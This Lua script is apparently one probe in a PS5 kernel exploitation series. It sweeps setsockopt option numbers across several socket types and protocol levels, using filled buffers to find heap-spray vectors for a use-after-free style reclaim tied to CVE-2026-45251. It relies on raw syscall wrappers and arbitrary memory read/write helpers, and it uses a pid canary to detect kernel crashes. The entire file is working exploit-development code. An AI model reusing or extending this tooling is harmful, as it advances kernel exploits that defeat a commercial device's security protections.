-- CRASH_CLASS: LOW
-- PROBE 500g: setsockopt spray vector sweep
--
-- 500f: IPv6 ext header options (49/50/51) all return -1 on PS5 14.10.
-- Need alternative spray: find setsockopt options that accept large buffers
-- and persist the kernel allocation (for cross-zone reclaim in CVE-2026-45251).
--
-- Strategy: sweep option numbers 0-255 at multiple protocol levels with 248B
-- buffer. Any ret=0 is a candidate spray vector.

print("=== PROBE 500g: SOCKOPT SPRAY VECTOR SWEEP ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local sc_socket = mk(97)
local sc_sso = mk(54)
local sc_gso = mk(55)
local sc_close = mk(6)

-- Build test buffers at various sizes
local function make_buf(size)
    local buf = memory.alloc(size + 16)
    for i = 0, size - 1, 4 do wd(N(buf) + i, 0x41414141) end
    return buf
end

local buf248 = make_buf(248)
local buf120 = make_buf(120)
local buf56  = make_buf(56)
local buf504 = make_buf(504)

local function try_sso(fd, level, opt, buf, size)
    local ok, ret = pcall(function()
        return sc_sso(uint64(fd), uint64(level), uint64(opt),
            uint64(N(buf)), uint64(size))
    end)
    if not ok then return -999 end
    return sgn(ret)
end

local function sweep(fd, level, level_name, buf, size, size_name)
    local hits = {}
    for opt = 0, 255 do
        if not alive() then
            print("  *** DIED at opt=" .. opt .. " ***")
            return hits
        end
        local ret = try_sso(fd, level, opt, buf, size)
        if ret == 0 then
            hits[#hits + 1] = opt
        end
    end
    return hits
end

local function report(hits, level_name, size_name)
    if #hits == 0 then
        print(string.format("  %s @ %s: 0 hits", level_name, size_name))
    else
        local parts = {}
        for _, h in ipairs(hits) do parts[#parts + 1] = tostring(h) end
        print(string.format("  %s @ %s: %d hits: %s", level_name, size_name, #hits, table.concat(parts, ",")))
    end
end

-- ========== Section A: IPv6/UDP socket ==========
print("--- A: IPv6/UDP (AF_INET6=28, SOCK_DGRAM=2, IPPROTO_UDP=17) ---")
local s6 = sgn(sc_socket(uint64(28), uint64(2), uint64(17)))
print("  fd=" .. s6)
if s6 > 0 then
    -- Level: IPPROTO_IPV6 = 41
    local h248 = sweep(s6, 41, "IPV6", buf248, 248, "248B")
    report(h248, "IPPROTO_IPV6(41)", "248B")

    if #h248 > 0 then
        local h120 = sweep(s6, 41, "IPV6", buf120, 120, "120B")
        report(h120, "IPPROTO_IPV6(41)", "120B")
    end

    -- Level: IPPROTO_UDP = 17
    local hu = sweep(s6, 17, "UDP", buf248, 248, "248B")
    report(hu, "IPPROTO_UDP(17)", "248B")

    -- Level: SOL_SOCKET = 0xFFFF
    local hs = sweep(s6, 0xFFFF, "SOL", buf248, 248, "248B")
    report(hs, "SOL_SOCKET(0xFFFF)", "248B")

    pcall(function() sc_close(uint64(s6)) end)
end

-- ========== Section B: TCP socket ==========
if alive() then
    print("")
    print("--- B: TCP (AF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6) ---")
    local st = sgn(sc_socket(uint64(2), uint64(1), uint64(6)))
    print("  fd=" .. st)
    if st > 0 then
        -- Level: IPPROTO_TCP = 6
        local ht = sweep(st, 6, "TCP", buf248, 248, "248B")
        report(ht, "IPPROTO_TCP(6)", "248B")

        -- Level: IPPROTO_IP = 0
        local hi = sweep(st, 0, "IP", buf248, 248, "248B")
        report(hi, "IPPROTO_IP(0)", "248B")

        pcall(function() sc_close(uint64(st)) end)
    end
end

-- ========== Section C: Raw IP socket ==========
if alive() then
    print("")
    print("--- C: Raw IP (AF_INET=2, SOCK_RAW=3, IPPROTO_RAW=255) ---")
    local sr = sgn(sc_socket(uint64(2), uint64(3), uint64(255)))
    print("  fd=" .. sr)
    if sr > 0 then
        local hr = sweep(sr, 0, "IP", buf248, 248, "248B")
        report(hr, "IPPROTO_IP(0)", "248B")

        pcall(function() sc_close(uint64(sr)) end)
    end
end

-- ========== Section D: AF_UNIX datagram ==========
if alive() then
    print("")
    print("--- D: Unix dgram (AF_UNIX=1, SOCK_DGRAM=2) ---")
    local su = sgn(sc_socket(uint64(1), uint64(2), uint64(0)))
    print("  fd=" .. su)
    if su > 0 then
        local hu = sweep(su, 0xFFFF, "SOL", buf248, 248, "248B")
        report(hu, "SOL_SOCKET(0xFFFF)", "248B")

        -- local domain level = 0
        local hl = sweep(su, 0, "LOCAL", buf248, 248, "248B")
        report(hl, "LOCAL(0)", "248B")

        pcall(function() sc_close(uint64(su)) end)
    end
end

-- ========== Section E: Deeper probe on any hits ==========
-- For each hit, try getsockopt to check if data persists and is readable
if alive() then
    print("")
    print("--- E: Verify persistence of any hits ---")

    -- Re-create sockets and test specific winners from above
    -- First, collect all unique (socket_type, level, opt) combos that hit at 248B
    -- Since we printed inline, let's just re-test IPV6 level opts that might work
    -- at smaller sizes to map the full range

    -- Test sizes: 8, 16, 24, 32, 40, 48, 56, 64, 80, 96, 120, 128, 248, 504
    local sizes = {8, 16, 24, 32, 40, 48, 56, 64, 80, 96, 120, 128, 160, 192, 248, 504}

    -- Re-sweep IPv6 at all sizes for option 49 (HOPOPTS) if any smaller size works
    local s6b = sgn(sc_socket(uint64(28), uint64(2), uint64(17)))
    if s6b > 0 then
        print("  IPv6 opt49(HOPOPTS) size sweep:")
        for _, sz in ipairs(sizes) do
            if sz % 8 == 0 then
                local b = make_buf(sz)
                -- Valid IPv6 ext header: byte0=0, byte1=(sz/8)-1
                wd(N(b), (sz / 8 - 1) * 256)
                local ret = try_sso(s6b, 41, 49, b, sz)
                if ret == 0 then
                    print(string.format("    opt49 @ %dB = OK <<<", sz))
                end
            end
        end

        -- Also sweep the high option range (Sony extensions?)
        print("  IPv6 opt range 64-255 @ 8B:")
        local b8 = make_buf(8)
        local high_hits = {}
        for opt = 64, 255 do
            local ret = try_sso(s6b, 41, opt, b8, 8)
            if ret == 0 then high_hits[#high_hits + 1] = opt end
        end
        if #high_hits > 0 then
            local parts = {}
            for _, h in ipairs(high_hits) do parts[#parts + 1] = tostring(h) end
            print("    hits: " .. table.concat(parts, ","))
        else
            print("    0 hits")
        end

        pcall(function() sc_close(uint64(s6b)) end)
    end
end

print("")
print("canary=" .. (alive() and N(native.fcall_with_rax(stub, 20)) or "DEAD"))
print("")
print("=== PROBE 500g COMPLETE ===")
